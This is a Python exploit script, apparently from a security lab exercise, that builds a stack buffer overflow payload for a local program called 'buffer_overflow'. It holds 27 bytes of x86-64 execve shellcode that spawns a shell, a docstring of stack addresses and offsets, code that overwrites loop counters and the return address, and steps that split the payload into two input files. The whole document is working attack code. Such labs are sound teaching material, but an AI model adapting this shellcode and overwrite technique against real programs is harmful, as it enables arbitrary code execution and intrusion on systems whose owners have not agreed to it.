#!/usr/bin/python3

import subprocess
import sys

SHELLCODE = (b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
             b"\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
             b"\x54\x5f\x99\x52\x57\x54\x5e\xb0"
             b"\x3b\x0f\x05") # 27 bytes
   
   
"""         
Useful stack addresses:   
    * buf inside gdb: 0x7fffffffdd50
    * buf outside gdb: 0x7fffffffdd90
    * original ret addr of bof function: 0x7fffffffddb8
    * idx: 0x7fffffffddac
    * byte_read1: 0x7fffffffdda8
    * byte_read2: 0x7fffffffdda4

Building the exploit:
    * 40 bytes between end of buffer and return address
    * need to write BUFSIZE + 40 + ret_addr bytes 
        = 64 + 40 + 8 = 112 bytes
    * to preserve the behaviour of the loop must overwrite
      byte_read1, byte_read2, idx:
        - reading 112 bytes means byte_read1 == byte_read2 = 112 / 2 = 56
        - idx is 92 bytes away from beginning of buf so before it is overwritten
          its value will be 92
    * bytes to write separated into:
        - 27 bytes of shellcode
        - 57 bytes of dummy data
        - 4 bytes to overwrite byte_read2
        - 4 bytes to overwrite byte_read1
        - 4 bytes to overwrite idx
        - 8 bytes of dummy data
        - 8 bytes of the ret addr
"""

def gen_dummy_data(num_bytes):
    return b"A" * num_bytes
    
    
def split_bytes(s):
    """
    Create two strings by putting 1 byte of the given string in each,
    alternating. If s has odd length pad str2 so that both have the same length
    """
    str1 = b""
    str2 = b""
    for i in range(len(s)):
        new_b = s[i].to_bytes(1, 'big')
        if i % 2 == 0:
            str1 += new_b
        else:
            str2 += new_b
            
    return (str1, str2)
    

def write_to_file(fname, s):
    with open(fname, 'wb') as f:
        f.write(s)
        

# remove old exploit files
print("Removing old exploits...")
subprocess.run(["rm", "exploit1", "exploit2"])
subprocess.run(["touch", "exploit1", "exploit2"])

# determine the buffer address converting it to bytes in little endian
print("Determining up-to-date buffer address...")
result = subprocess.run(["./buffer_overflow"], stdout=subprocess.PIPE)
buf_addr = int(result.stdout[-15:-1].decode(), 16).to_bytes(8, 'little')

# build the new exploit string
print("Building exploit content...")
EXPLOIT = SHELLCODE       
EXPLOIT += gen_dummy_data(57)
EXPLOIT += b"\x38\x00\x00\x00" # byte_read2 = 56
EXPLOIT += b"\x38\x00\x00\x00" # byte_read1 = 56
EXPLOIT += b"\x5c\x00\x00\x00" # idx = 92
EXPLOIT += gen_dummy_data(8) # more dummy As, but why? I don't understand
EXPLOIT += buf_addr # ret addr

# split the payload into 2 parts
print("Splitting payload into 2 parts...")
s1, s2 = split_bytes(EXPLOIT)

# write 1 part to each file
print("Writing payload to exploit1...")
write_to_file("exploit1", s1)
print("Writing payload to exploit2...")
write_to_file("exploit2", s2)

print("Done!")
        
